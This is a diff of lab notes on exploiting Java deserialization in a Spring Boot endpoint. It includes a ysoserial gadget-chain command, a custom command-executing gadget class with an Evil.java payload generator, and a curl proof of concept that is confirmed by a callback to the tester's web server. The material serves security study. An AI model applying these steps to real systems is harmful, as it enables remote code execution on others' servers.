@@ -15,18 +15,16 @@
   - Thus, we can use the `FileUpload1` gadget chain from `ysoserial`: `java -jar ysoserial.jar FileUpload1 'write;/tmp;HACKEEED' | base64`
   - We send this to our `Spring Boot` app, which will create a randomly named file (e.g. `/tmp/upload_1e2897d1_aac7_4210_8911_57cbb6ac37c0_00000000.tmp`) in `/tmp` with the content `HACKEEED`
 
-* We also created our own `Gadget Chain`..
+* We also created our own `Gadget Chain` -> `BookRceReadObject` (uses the gadget `readObject`)
   * `General Description`:
-    - We created some new classes, e.g. `BookRceSetter.java` and `BookRceSetter.java` that execute a command upon (e.g. upon deserialization, upon calling a setter, etc.)
-    - We also create a separate mini app `Evil.java` where we serialize an instance of these classes, give it a command of our choosing, and then send the serialized base64-encoded string to `POST /deserialize`
+    - We created a new class `BookRceReadObject.java` that execute a command upon deserialization
+    - We also create a separate mini app `Evil.java` where we serialize an instance of this class, give it a command of our choosing, and then send the serialized base64-encoded string to `POST /deserialize`
   * `Command to Execute`:
-    - You can adjust the command to execute in `Evil.java` (this can't be done via a command line argument for now - Booo, I know.)
+    - You can adjust the command to execute in `Evil.java` (this can't be done via a command line argument for now - Boo, I know.)
   * `Setup`:
     - We first compile `Evil.java` via `javac Evil.java BookRceSetter.java BookRceSetter.java`
     - Now, we `cd` into the `/src/main/java` folder, and run `java com.example.my.tests.Evil`
-      - This creates 2 `naughty_X.ser` files which contain a base64 encoded version of our serialized payloads
-        - `naughty_BookRceReadObject.ser` -> Contains a payload that will execute a command upon deserialization
-        - `naughty_BookRceSetter.ser` -> Contains a payload that will execute upon a setter being called
+    - We now use the generated file `naughty_BookRceReadObject.ser` that contains a base64 encoded version of our serialized payload
   * `Exploitation`:
     - `PoC` - `curl`:
       - We run a web server via `python3 -m http.server 82`
@@ -35,5 +33,12 @@
         POST /deserialize
         Content-Type: application/json
 
-        rO0ABX...
-      - If everything works, our web server gets a hit.
+        <content of `naughty_BookRceReadObject.ser`>
+      - If everything works, our web server gets hit
+
+* Testing `Setter Gadget Chain` -> Not working
+  - We also create `BookRceSetter.java` which would execute a command upon calling a setter
+    - Our idea is that a `setter` might be automatically invoked upon deserialization (to set the corresponding value)
+  - We do the same steps as in the above section, send the payload from `naughty_BookRceSetter.ser` to `/POST deserialize`...
+    - But it's not working.. Our command does not execute...
+  
